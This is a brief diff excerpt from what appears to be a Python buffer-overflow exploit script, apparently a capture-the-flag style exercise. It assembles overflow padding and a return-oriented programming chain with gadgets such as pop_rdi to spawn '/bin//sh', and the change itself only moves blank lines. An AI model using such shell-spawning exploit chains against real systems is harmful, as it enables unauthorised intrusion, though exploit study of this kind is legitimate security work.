@@ -41,6 +41,7 @@ buf += pack('<Q', 0x00000000000004d2)
 buf += sys_
 
 buf += ("A" * 1536 + "B" * 24)
+
 buf += xor_a
 buf += pop_s
 buf += stack
@@ -48,7 +49,6 @@ buf += pop_a
 buf += '/bin//sh'
 buf += move
 buf += xor_a
-
 buf += pop_d
 buf += zero_
 buf += pop_rdi
